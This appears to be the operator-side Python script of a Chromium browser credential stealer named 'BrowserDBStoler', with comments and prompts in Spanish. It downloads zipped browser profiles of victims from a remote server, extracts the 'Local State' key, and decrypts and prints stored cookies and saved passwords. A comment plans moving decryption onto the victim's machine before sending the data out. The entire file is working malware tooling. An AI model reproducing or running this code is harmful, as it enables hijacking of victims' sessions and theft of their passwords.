import os, time
import sqlite3
import json
import base64
import win32crypt
import requests # pip install requests
from Cryptodome.Cipher import AES # pip install pycryptodome
from zipfile import ZipFile

REMOTE_WORKSPACE = "https://dev.crizacio.com/BrowserDBStoler/"
COOKIES_API = REMOTE_WORKSPACE+"cookies.php"
LOCAL_WORKSPACE = os.path.dirname(os.path.realpath(__file__))+"\\"
print(f"Trabajando en '{LOCAL_WORKSPACE}'.")
os.system("pause")

repetir = True
remoteZIP_Selected = None
encryption_key = None
def ListarArchivosDelServidor():
    global remoteZIP_Selected
    os.system("cls")
    remoteCookies = requests.get(str(f"{COOKIES_API}?get=files")).json()['description']
    i = 1
    for item in remoteCookies:
        print("    {}) {}".format(i, item))
        i += 1
    tarjet = int(input("Archivo a seleccionar (0 para omitir): "))
    if tarjet != 0:
        remoteZIP_Selected = remoteCookies[tarjet-1]
        print("Seleccionado: {}".format(remoteZIP_Selected))
        os.system("pause")

def DescargarArchivoSeleccionado():
    global remoteZIP_Selected
    os.system("cls")
    if remoteZIP_Selected == None:
        print("Debe seleccionar un archivo remoto!")
        ListarArchivosDelServidor()
    else:
        print("Descargando...")
        open(LOCAL_WORKSPACE+remoteZIP_Selected, 'wb').write(requests.get(str(f"{REMOTE_WORKSPACE}cookies/{remoteZIP_Selected}")).content)
        print("Archivo descargado correctamente!")
        time.sleep(2)
        DescomprimirArchivoDescargado(LOCAL_WORKSPACE+remoteZIP_Selected)
        os.system("pause")

def DescomprimirArchivoDescargado(filePath: str = None):
    os.system("cls")
    if filePath == None:
        filePath = LOCAL_WORKSPACE+remoteZIP_Selected
    print("Descomprimiendo...")
    time.sleep(2)
    with ZipFile(filePath, 'r') as zip_ref:
        unzipDir = str("{}".format(filePath.replace(".zip", "")))
        os.mkdir(unzipDir)
        zip_ref.extractall(unzipDir)
    time.sleep(1)
    print("Descompresion exitosa!")
    time.sleep(2)

def ObtenerLlaveDeCifrado():
    global encryption_key, remoteZIP_Selected
    jsonContent = None
    localstatePath = None
    for root, dir, files in os.walk(LOCAL_WORKSPACE+remoteZIP_Selected.replace(".zip", "")):
      if "Local State" in files:
        localstatePath = os.path.join(root, "Local State")
    try:
        with open(localstatePath, 'r') as file:
            jsonContent = json.loads(file.read())
    except:
        return None
    try:
        # FINALMENTE:
        # EL ERROR Invalid key to use in the specified state QUE HACE QUE encryption_key = None
        # SE DEBE A UN PROBLEMA CON LA CRIPTOGRAFIA. LA LLAVE QUE SE OBTIENE DEL JSON
        # SOLO PUEDE SER USADA POR EL MISMO EQUIPO QUE CREO LA LLAVE.
        # ENTONCES, UNA SOLUCIONES:
        #   EL DESCIFRADO DE LAS COOKIES SE DEBE LLEVAR EN EL EQUIPO VICTIMA
        #   PARA LUEGO SER ENVIADO AL SERVIDOR.
        # FINALMENTE CTM WEON AAAAAA
        # https://stackoverflow.com/questions/48675338/python-error-cryptprotectdata-key-not-valid-for-use-in-specified-state
        encryption_key = base64.b64decode(jsonContent['os_crypt']['encrypted_key'])[5:]
        encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    except Exception as ex:
        print(ex)
        encryption_key = None
    return encryption_key

def DesencriptarValor(data, key):
    # try:
    #     cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
    #     value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
    # except:
    #     value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1] or value or 0
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def DescifrarCookies():
    global encryption_key, remoteZIP_Selected
    cookiesFiles = []
    print("Descifrando cookies...")
    time.sleep(2)
    for root, dir, files in os.walk(LOCAL_WORKSPACE+remoteZIP_Selected.replace(".zip", "")):
        if "Cookies" in files:
            cookiesFiles.append(os.path.join(root, "Cookies"))
    for cookie in cookiesFiles:
        conn = sqlite3.connect(cookie)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS cocked (host_key TEXT, name TEXT, decrypted_value TEXT)")
        cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
        for host_key, name, value, encrypted_value in cursor.fetchall():
            host_key = host_key.decode('utf-8')
            name = name.decode('utf-8')
            value = DesencriptarValor(encrypted_value, encryption_key)
            value = value.decode('utf-8')
            cursor.execute("INSERT INTO cocked VALUES (?, ?, ?);", (host_key, name, value))
            print()
            print(host_key)
            print(name)
            print(value)
            print()
        conn.commit()
        conn.close()
    time.sleep(0.5)
    print("Cookies descifradas!")
    time.sleep(2)

def DescifrarSigning():
    global encryption_key, remoteZIP_Selected
    signinFiles = []
    print("Descifrando sesiones...")
    time.sleep(2)
    for root, dir, files in os.walk(LOCAL_WORKSPACE+remoteZIP_Selected.replace(".zip", "")):
        if "Login Data" in files:
            signinFiles.append(os.path.join(root, "Login Data"))
    for signin in signinFiles:
        conn = sqlite3.connect(signin)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS cocked (origin_url TEXT, password_value TEXT)")
        cursor.execute('SELECT origin_url, password_value FROM logins')
        for origin_url, password_value in cursor.fetchall():
            origin_url = origin_url.decode('utf-8')
            valuePassword = DesencriptarValor(password_value, encryption_key)
            # try:
            #     cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=password_value[3:3+12])
            #     valuePassword = cipher.decrypt_and_verify(password_value[3+12:-16], password_value[-16:])
            # except:
            #     valuePassword = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] or valuePassword or 0
            valuePassword = valuePassword.decode('utf-8')
            cursor.execute("INSERT INTO cocked VALUES (?, ?);", (origin_url, valuePassword))
            print()
            print(origin_url)
            print(valuePassword)
            print()
        conn.commit()
        conn.close()
    time.sleep(0.5)
    print("Sesiones descifradas!")
    time.sleep(2)

def DescifrarBaseDeDatos():
    global encryption_key, remoteZIP_Selected
    os.system("cls")
    if remoteZIP_Selected == None:
        print("Debe seleccionar un archivo remoto!")
        ListarArchivosDelServidor()
    print("Descifrando...")
    encryption_key = ObtenerLlaveDeCifrado()
    DescifrarCookies()
    DescifrarSigning()
    print("Base de datos descifrada!")
    os.system("pause")

def menuPrincipal():
    global repetir
    try:
        print("Ingrese el número de la opción a la que desea ingresar")
        print("    1. Listar archivos del servidor.")
        print("    2. Descargar archivo seleccionado.".format())
        print("    3. Descomprimir archivo seleccionado.")
        print("    4. Descifrar base de datos Chromium.")
        print("    0. Salir")
        print("")
        opcion = None
        try:
            opcion = int(input("Opción: "))
        except:
            print("Se espera un valor númerico para la opción.")
            time.sleep(1)
            return
        if (opcion == 1):
            ListarArchivosDelServidor()
        elif (opcion == 2):
            DescargarArchivoSeleccionado()
        elif (opcion == 3):
            DescomprimirArchivoDescargado()
        elif (opcion == 4):
            DescifrarBaseDeDatos()
        elif (opcion == 0):
            repetir = False
        else:
            print("Opción no existente.")
            time.sleep(1)
            return
    except Exception as e:
        print("Ups! Un error. {}".format(e))
        time.sleep(2)
        os.system("pause")
        return

def main():
    global repetir
    while repetir:
        os.system("cls")
        menuPrincipal()
main()
